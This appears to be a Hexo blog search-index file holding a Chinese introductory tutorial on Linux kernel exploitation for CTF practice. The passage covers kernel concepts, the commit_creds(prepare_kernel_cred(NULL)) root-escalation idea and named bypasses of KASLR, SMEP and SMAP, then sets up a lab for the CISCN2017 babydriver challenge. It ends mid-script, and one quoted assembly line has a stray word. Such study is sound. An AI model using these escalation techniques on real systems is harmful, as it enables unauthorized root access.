<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>linux_kernel_pwn初探</title>
    <link href="/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/"/>
    <url>/2021/10/22/linux_kernel_pwn%E5%88%9D%E6%8E%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="一、内核"><a href="#一、内核" class="headerlink" title="一、内核"></a>一、内核</h3><p><strong>操作系统</strong>（Operation System）本质上就是一个管理着计算机硬件和软件资源并为计算机程序提供公共服务的系统软件，其主要功能就是调度系统资源、控制IO设备等等。Linux系统整体结构如下。</p><p><img src="https://i.loli.net/2021/10/22/rudK3BiUF9lAjeq.png"></p><p><strong>内核 （kernel）</strong>也是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理，kernel 是现代操作系统最基本的部分。</p><p><img src="https://i.loli.net/2021/10/22/VmRZaEvJj1yNO7P.png"></p><p>kernel 最主要的功能有两点：</p><ol><li><strong>控制并与硬件进行交互</strong></li><li><strong>提供 application 能运行的环境</strong></li></ol><p>包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。</p><p>需要注意的是，<strong>kernel 的 crash 通常会引起重启</strong>。</p><h3 id="二、分级保护域"><a href="#二、分级保护域" class="headerlink" title="二、分级保护域"></a>二、分级保护域</h3><p>intel CPU 将 CPU 的特权级别分为 4 个级别：<strong>Ring 0</strong>, Ring 1, Ring 2, <strong>Ring 3</strong>，权限等级以此降低。</p><p><img src="https://i.loli.net/2021/10/22/yLRf5Y2VaM6suqe.png" alt="image-20211022132633477"></p><p>Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。</p><p><strong>大多数的现代操作系统只使用了 Ring 0 和 Ring 3，其中 kernel 运行在 ring0，用户态程序运行在 ring3</strong></p><blockquote><p>使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。</p></blockquote><h4 id="用户态和内核态"><a href="#用户态和内核态" class="headerlink" title="用户态和内核态"></a>用户态和内核态</h4><p><strong>当进程运行在内核空间时就处于内核态，运行在用户空间时则处于用户态</strong></p><p>在内核态下，进程运行在内核地址空间中，<strong>此时 CPU 可以执行任何指令</strong><br>在用户态下，进程运行在用户地址空间中，<strong>此时CPU所执行的指令是受限的</strong></p><h4 id="进程运行态切换"><a href="#进程运行态切换" class="headerlink" title="进程运行态切换"></a>进程运行态切换</h4><p>应用程式运行时总会经历无数次的用户态与内核态之间的转换，这是因为用户进程往往需要使用内核所提供的各种功能（如IO等），此时就需要陷入（trap）内核，待完成之后再“着陆”回用户态。</p><h5 id="用户态-gt-内核态"><a href="#用户态-gt-内核态" class="headerlink" title="用户态 -&gt; 内核态"></a>用户态 -&gt; 内核态</h5><p>当发生<strong>系统调用</strong>，<strong>产生异常</strong>，<strong>外设产生中断</strong>等事件时，会发生用户态到内核态的切换，具体的过程为：</p><ol><li>通过 <code>swapgs</code> 切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过 push 保存各寄存器值，具体的 <a href="http://elixir.free-electrons.com/linux/v4.12/source/arch/x86/entry/entry_64.S">代码</a> 如下:</li></ol><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs awk"> ENTRY(entry_SYSCALL_64)<br> <span class="hljs-regexp">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span><br> SWAPGS_UNSAFE_STACK<br><br> <span class="hljs-regexp">/* 保存栈值，并设置内核栈 */</span><br> movq %rsp, PER_CPU_VAR(rsp_scratch)<br> movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp<br><br><br><span class="hljs-regexp">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span><br><span class="hljs-regexp">/* Construct struct pt_regs on stack */</span><br>pushq  <span class="hljs-variable">$__USER_DS</span>      <span class="hljs-regexp">/* pt_regs-&gt;ss */</span><br>pushq  PER_CPU_VAR(rsp_scratch)  <span class="hljs-regexp">/* pt_regs-&gt;sp */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;flags */</span><br>pushq  <span class="hljs-variable">$__USER_CS</span>      <span class="hljs-regexp">/* pt_regs-&gt;cs */</span><br>pushq  %rcx             <span class="hljs-regexp">/* pt_regs-&gt;ip */</span><br>pushq  %rax             <span class="hljs-regexp">/* pt_regs-&gt;orig_ax */</span><br>pushq  %rdi             <span class="hljs-regexp">/* pt_regs-&gt;di */</span><br>pushq  %rsi             <span class="hljs-regexp">/* pt_regs-&gt;si */</span><br>pushq  %rdx             <span class="hljs-regexp">/* pt_regs-&gt;dx */</span><br>pushq  %rcx tuichu    <span class="hljs-regexp">/* pt_regs-&gt;cx */</span><br>pushq  $-ENOSYS        <span class="hljs-regexp">/* pt_regs-&gt;ax */</span><br>pushq  %r8              <span class="hljs-regexp">/* pt_regs-&gt;r8 */</span><br>pushq  %r9              <span class="hljs-regexp">/* pt_regs-&gt;r9 */</span><br>pushq  %r10             <span class="hljs-regexp">/* pt_regs-&gt;r10 */</span><br>pushq  %r11             <span class="hljs-regexp">/* pt_regs-&gt;r11 */</span><br>sub $(<span class="hljs-number">6</span>*<span class="hljs-number">8</span>), %rsp      <span class="hljs-regexp">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span><br></code></pre></td></tr></table></figure><ol start="4"><li>通过汇编指令判断是否为 <code>x32_abi</code>。</li><li>通过系统调用号，跳到全局变量 <code>sys_call_table</code> （保存着系统调用的函数指针）相应位置继续执行系统调用。</li></ol><h5 id="内核态-gt-用户态"><a href="#内核态-gt-用户态" class="headerlink" title="内核态 -&gt; 用户态"></a>内核态 -&gt; 用户态</h5><p>退出时，流程如下：</p><ol><li>通过 <code>swapgs</code> 恢复 GS 值</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户控件继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）</li></ol><h3 id="三、系统调用"><a href="#三、系统调用" class="headerlink" title="三、系统调用"></a>三、系统调用</h3><p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如 scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和 write））。</p><blockquote><p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和 <em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64 位和 32 位的系统调用号。</p></blockquote><p>使用系统调用时会<strong>陷入内核态，接着由操作系统完成请求</strong></p><p>系统调用本质上与一般的C库函数没有区别，不同的是系统调用位于内核空间，以内核态运行</p><h4 id="进入系统调用"><a href="#进入系统调用" class="headerlink" title="进入系统调用"></a>进入系统调用</h4><p>Linux 下进入系统调用有两种主要的方式：</p><ul><li>32位：执行 <code>int 0x80 </code>汇编指令（80号中断）</li><li>64位：执行 <code>syscall</code> 汇编指令 / 执行 <code>sysenter</code> 汇编指令（only intel）</li></ul><p>接下来就是由用户态进入到内核态的流程</p><p>Linux下的系统调用以<code>eax/rax</code>寄存器作为<strong>系统调用号</strong>，参数传递约束如下：</p><ul><li>32 位：<code>ebx、ecx、edx、esi、edi、ebp</code>作为第一个参数、第二个参数…进行参数传递</li><li>64 位：<code>rdi、rsi、rdx、rcx、r8、r9</code>作为第一个参数、第二个参数…进行参数传递</li></ul><h4 id="退出系统调用"><a href="#退出系统调用" class="headerlink" title="退出系统调用"></a>退出系统调用</h4><p>同样地，内核执行完系统调用后退出系统调用也有对应的两种方式：</p><ul><li>执行<code>iret</code>汇编指令</li><li>执行 <code>sysret</code> 汇编指令 / 执行<code>sysexit</code>汇编指令（only Intel）</li></ul><p>接下来就是由内核态回退至用户态的流程</p><h3 id="四、进程权限管理"><a href="#四、进程权限管理" class="headerlink" title="四、进程权限管理"></a>四、进程权限管理</h3><h4 id="进程描述符"><a href="#进程描述符" class="headerlink" title="进程描述符"></a>进程描述符</h4><p>在内核中使用结构体 <code>task_struct</code> 表示一个进程，该结构体定义于内核源码<code>include/linux/sched.h</code>中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// [include/linux/sched.h]</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">task_struct</span> &#123;</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">long</span> state;            <span class="hljs-comment">// process state (running, stopped, ...)</span><br>    <span class="hljs-keyword">void</span> *<span class="hljs-built_in">stack</span>;                    <span class="hljs-comment">// task&#x27;s stack pointer</span><br>    <span class="hljs-keyword">int</span> prio;                       <span class="hljs-comment">// process priority</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span>           <span class="hljs-comment">// memory address space</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">files_struct</span> *<span class="hljs-title">files</span>;</span>     <span class="hljs-comment">// open file information</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred</span>;</span>        <span class="hljs-comment">// credentials</span><br>  <span class="hljs-comment">// ...</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>进程，线程和内核线程都是使用这个task_struct结构体，在内核中最终都会调用do_fork()函数。</p><p><img src="https://i.loli.net/2021/10/22/D9NyjqhiaSnsb6L.png" alt="image-20211022134908132"></p><h4 id="进程权限凭证"><a href="#进程权限凭证" class="headerlink" title="进程权限凭证"></a>进程权限凭证</h4><p>之前提到 kernel 记录了进程的权限，更具体的，是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。该结构定义在<code>include/linux/cred.h</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-keyword">atomic_t</span>    usage;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span><br>    <span class="hljs-keyword">atomic_t</span>    subscribers;    <span class="hljs-comment">/* number of processes subscribed */</span><br>    <span class="hljs-keyword">void</span>        *put_addr;<br>    <span class="hljs-keyword">unsigned</span>    magic;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CRED_MAGIC  0x43736564</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-keyword">kuid_t</span>      uid;        <span class="hljs-comment">/* real UID of the task */</span><br>    <span class="hljs-keyword">kgid_t</span>      gid;        <span class="hljs-comment">/* real GID of the task */</span><br>    <span class="hljs-keyword">kuid_t</span>      suid;       <span class="hljs-comment">/* saved UID of the task */</span><br>    <span class="hljs-keyword">kgid_t</span>      sgid;       <span class="hljs-comment">/* saved GID of the task */</span><br>    <span class="hljs-keyword">kuid_t</span>      euid;       <span class="hljs-comment">/* effective UID of the task */</span><br>    <span class="hljs-keyword">kgid_t</span>      egid;       <span class="hljs-comment">/* effective GID of the task */</span><br>    <span class="hljs-keyword">kuid_t</span>      fsuid;      <span class="hljs-comment">/* UID for VFS ops */</span><br>    <span class="hljs-keyword">kgid_t</span>      fsgid;      <span class="hljs-comment">/* GID for VFS ops */</span><br>    <span class="hljs-keyword">unsigned</span>    securebits; <span class="hljs-comment">/* SUID-less security management */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_inheritable; <span class="hljs-comment">/* caps our children can inherit */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_permitted;  <span class="hljs-comment">/* caps we&#x27;re permitted */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_effective;  <span class="hljs-comment">/* caps we can actually use */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_bset;   <span class="hljs-comment">/* capability bounding set */</span><br>    <span class="hljs-keyword">kernel_cap_t</span>    cap_ambient;    <span class="hljs-comment">/* Ambient capability set */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_KEYS</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>   jit_keyring;    <span class="hljs-comment">/* default keyring to attach requested</span><br><span class="hljs-comment">                     * keys to */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span> __<span class="hljs-title">rcu</span> *<span class="hljs-title">session_keyring</span>;</span> <span class="hljs-comment">/* keyring inherited over fork */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">process_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this process */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">thread_keyring</span>;</span> <span class="hljs-comment">/* keyring private to this thread */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">key</span>  *<span class="hljs-title">request_key_auth</span>;</span> <span class="hljs-comment">/* assumed request_key authority */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> CONFIG_SECURITY</span><br>    <span class="hljs-keyword">void</span>        *security;  <span class="hljs-comment">/* subjective LSM security */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_struct</span> *<span class="hljs-title">user</span>;</span>   <span class="hljs-comment">/* real user ID subscription */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_namespace</span> *<span class="hljs-title">user_ns</span>;</span> <span class="hljs-comment">/* user_ns the caps and keyrings are relative to. */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">group_info</span> *<span class="hljs-title">group_info</span>;</span>  <span class="hljs-comment">/* supplementary groups for euid/fsgid */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu</span>;</span>        <span class="hljs-comment">/* RCU deletion hook */</span><br>&#125; __randomize_layout;<br></code></pre></td></tr></table></figure><h4 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h4><p>在内核空间有如下两个函数，都位于<code>kernel/cred.c</code>中：</p><ul><li><p><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的cred结构体，并返回一个新的cred结构体，需要注意的是<code>daemon</code>参数应为<strong>有效的进程描述符地址或NULL</strong></p></li><li><p><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的<code>cred</code>结构体应用到进程</p></li></ul><p>查看<code>prepare_kernel_cred()</code>函数源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">struct cred *<span class="hljs-title">prepare_kernel_cred</span><span class="hljs-params">(struct task_struct *daemon)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">old</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span>;</span><br><br><span class="hljs-keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">new</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br>kdebug(<span class="hljs-string">&quot;prepare_kernel_cred() alloc %p&quot;</span>, <span class="hljs-keyword">new</span>);<br><br><span class="hljs-keyword">if</span> (daemon)<br>old = get_task_cred(daemon);<br><span class="hljs-keyword">else</span><br>old = get_cred(&amp;init_cred);<br>...<br></code></pre></td></tr></table></figure><p>在<code>prepare_kernel_cred()</code>函数中，若传入的参数为NULL，则会缺省使用<code>init</code>进程的<code>cred</code>作为模板进行拷贝，<strong>即可以直接获得一个标识着root权限的cred结构体</strong></p><p>那么我们不难想到，只要我们能够在内核空间执行<code>commit_creds(prepare_kernel_cred(NULL))</code>，那么就能够将进程的权限提升到<code>root</code>，再运行一个system(“/bin/sh”)就能拿到root的shell了。</p><h3 id="五、可装载内核模块（LKM）"><a href="#五、可装载内核模块（LKM）" class="headerlink" title="五、可装载内核模块（LKM）"></a>五、可装载内核模块（LKM）</h3><p>可加载核心模块 (或直接称为内核模块) 就像运行在内核空间的可执行程序，包括:</p><ul><li>驱动程序（Device drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><p>LKMs 的文件格式和用户态的可执行程序相同，Linux 下为 ELF，Windows 下为 exe/dll，mac 下为 MACH-O，因此我们可以用 IDA 等工具来分析内核模块。</p><p>模块可以被单独编译，但不能单独运行。它在运行时被链接到内核作为内核的一部分在内核空间运行，这与运行在用户控件的进程不同。</p><p>模块通常用来实现一种文件系统、一个驱动程序或者其他内核上层的功能。</p><blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核 (monolithic kernel)。单内核的优点是效率高，因为所有的内容都集合在一起，但缺点是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p></blockquote><p>模块的编译需要用到Makefile，通常与LKM相关的命令有以下三个：</p><ul><li><code>lsmod</code>：列出现有的LKMs</li><li><code>insmod</code>：装载新的LKM（需要root）</li><li><code>rmmod</code>：从内核中移除LKM（需要root）</li></ul><h3 id="六、保护机制"><a href="#六、保护机制" class="headerlink" title="六、保护机制"></a>六、保护机制</h3><p>跟用户程序类似，内核也会有各种各样的保护机制</p><h4 id="KASLR"><a href="#KASLR" class="headerlink" title="KASLR"></a>KASLR</h4><p>KASLR即<code>内核空间地址随机化</code>（kernel address space layout randomize），与用户态程序的ASLR相类似——在内核镜像映射到实际的地址空间时加上一个偏移值，但是内核内部的相对偏移其实还是不变的</p><p>在未开启KASLR保护机制时，内核的基址为<code>0xffffffff81000000</code></p><p>像用户空间的绕过手法一样，可以通过leak memory来bypass</p><h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>SMEP即<code>管理模式执行保护</code>（Supervisor Mode Execution Prevention），用以阻止<strong>内核空间直接执行用户空间的数据</strong>。CR4寄存器的第20位标志着是否开启这个保护。</p><p><img src="https://i.loli.net/2021/10/22/w3SYbNiIB452d1Q.png"></p><p><img src="https://i.loli.net/2021/10/22/Kqyt6GzTJVahiYp.png"></p><p>绕过方法：</p><ul><li>kernel ROP</li><li>修改addr_limit，set_fs(-1)（addr_limit用于限制用户态程序能访问的地址的最大值，通过set_fs可以改变thread_info-&gt;addr_limit的大小，如果把它修改成 <code>0xffffffffffffffff</code> ，我们就可以读写整个内存空间了 包括 <strong>内核空间</strong>）</li><li>ret2dir，在设计中，为了使隔离的数据进行交换时具有更高的性能，隐性地址共享始终存在（VDSO &amp; VSYSCALL），<strong>用户态进程与内核共享同一块物理内存</strong>，因此通过隐性内存共享可以完整的绕过软件和硬件的隔离保护，这种攻击方式被称之为<code>ret2dir</code>（return-to-direct-mapped memory ）</li></ul><h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>SMAP即<code>管理模式访问保护</code>（Supervisor Mode Access Prevention），用以阻止<strong>内核空间直接访问用户空间的数据</strong>。CR4寄存器的第21位标志着是否开启这个保护。</p><p><img src="https://i.loli.net/2021/10/22/A8sRhlYOMNUeSy3.png"></p><p><img src="https://i.loli.net/2021/10/22/Kqyt6GzTJVahiYp.png"></p><p>绕过方法（较为苛刻）：</p><ul><li>ret2dir</li><li>ksma</li><li>modprobe_path</li></ul><h4 id="KPTI"><a href="#KPTI" class="headerlink" title="KPTI"></a>KPTI</h4><p>KPTI即<code>内核页表隔离</code>（Kernel page-table isolation）,内核空间与用户空间分别使用两组不同的页表集，这对于内核的内存管理产生了根本性的变化</p><p><img src="https://i.loli.net/2021/10/22/8mokKdw7JE1YCHt.png" alt="image-20211022144411995"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>这里全程以<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/kernel/CISCN2017-babydriver">CISCN2017 - babydriver</a>的环境搭建作为演示</p><h3 id="一、编译内核"><a href="#一、编译内核" class="headerlink" title="一、编译内核"></a>一、编译内核</h3><p>首先到linux内核的<a href="https://www.kernel.org/">官网</a>下载一份内核源代码并解压:</p><p><img src="https://i.loli.net/2021/10/22/IJEA2BLK3slYPet.png"></p><p>我下载的<a href="https://cdn.kernel.org/pub/linux/kernel/v4.x/linux-4.4.72.tar.gz">4.4.72</a>的内核版本</p><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tar -xvf linux-4.4.72.tar.gz<br></code></pre></td></tr></table></figure><p>安装一些环境依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get install git fakeroot build-essential ncurses-dev xz-utils qemu flex libncurses5-dev fakeroot build-essential ncurses-dev xz-utils libssl-dev bc bison libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-dev libelf-dev<br></code></pre></td></tr></table></figure><p>这些依赖并不一定全部概况完了,在编译的过程中可能在报错信息中还要提示你安装一些依赖,具体根据报错提示再进行安装就可以</p><p>然后进入解压目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd linux-4.4.72/<br>make menuconfig<br></code></pre></td></tr></table></figure><p>一般默认就可以直接退出保存，运行如下命令开始编译，生成内核镜像（可以<code>nproc</code>查看本机CPU核数）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make -j12 bzImage<br></code></pre></td></tr></table></figure><p>完成之后有如下信息</p><p><img src="https://i.loli.net/2021/10/22/QvOFBlxAWTVMeC5.png"></p><p>在当前目录下提取到<code>vmlinux</code>，为编译出来的原始内核文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">file vmlinux<br>vmlinux: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=56951e7dc9f45ad402bc9499e20cf1c050710dc8, not stripped<br></code></pre></td></tr></table></figure><p>在当前目录下的<code>arch/x86/boot/</code>目录下提取到<code>bzImage</code>，为压缩后的内核文件，适用于大内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">file arch/x86/boot/bzImage<br>arch/x86/boot/bzImage: Linux kernel x86 boot executable bzImage, version 4.4.72 (verf1sh@ubuntu) #1 SMP Fri Oct 22 05:23:12 PDT 2021, RO-rootFS, swap_dev 0x6, Normal VGA<br></code></pre></td></tr></table></figure><h3 id="二、编译busybox构建文件系统"><a href="#二、编译busybox构建文件系统" class="headerlink" title="二、编译busybox构建文件系统"></a>二、编译busybox构建文件系统</h3><p>BusyBox 是一个集成了三百多个最常用Linux命令和工具的软件，包含了例如ls、cat和echo等一些简单的工具</p><p>在<a href="https://busybox.net/downloads/">busybox.net</a>下载自己想要的版本，这里选用<code>busybox-1.33.0.tar.bz2</code>这个版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs she">cd ..<br>wget https://busybox.net/downloads/busybox-1.33.1.tar.bz2<br>tar -jxvf busybox-1.33.1.tar.bz2<br>cd busybox-1.33.1/<br>make menuconfig<br></code></pre></td></tr></table></figure><p>注意为了避免不必要的麻烦，这个选择静态编译</p><blockquote><p>Setting -&gt; Build Options -&gt; Build static binary (no shared libs)</p></blockquote><p><img src="https://i.loli.net/2021/10/22/V4zu2XcZKW9DhSQ.png"></p><p>保存后直接编译 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">make install<br></code></pre></td></tr></table></figure><p>编译完make install后，在busybox源代码的根目录下会有一个 _install目录下会存放好编译后的文件</p><p><img src="https://i.loli.net/2021/10/22/YB4ZPL6srGtEV7D.png" alt="image-20211022211739363"></p><p>接下来一些初始化操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs she">cd _install<br>mkdir -pv &#123;bin,etc/init.d,sbin,etc,proc,sys,home,lib64,lib/x86_64-linux-gnu,usr/&#123;bin,sbin&#125;&#125; <br>touch etc/init.d/rcS<br>chmod +x ./etc/init.d/rcS<br></code></pre></td></tr></table></figure><p>配置etc/inttab，写入如下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">::sysinit:/etc/init.d/rcS<br>::askfirst:/bin/ash<br>::ctrlaltdel:/sbin/reboot<br>::shutdown:/sbin/swapoff -a<br>::shutdown:/bin/umount -a -r<br>::restart:/sbin/init<br></code></pre></td></tr></table></figure><p>在上面的文件中指定了系统初始化脚本，因此接下来配置<code>etc/init.d/rcS</code>，写入如下内容</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br>mount -t proc none /proc<br>mount -t sys none /sys<br>/bin/mount -n -t sysfs none /sys<br>/bin/mount -t ramfs none /dev<br>/sbin/mdev -s<br></code></pre></td></tr></table></figure><p>主要是配置各种目录的挂载</p><p>也可以在根目录下创建<code>init</code>文件，写入如下内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br> <br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br><br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span 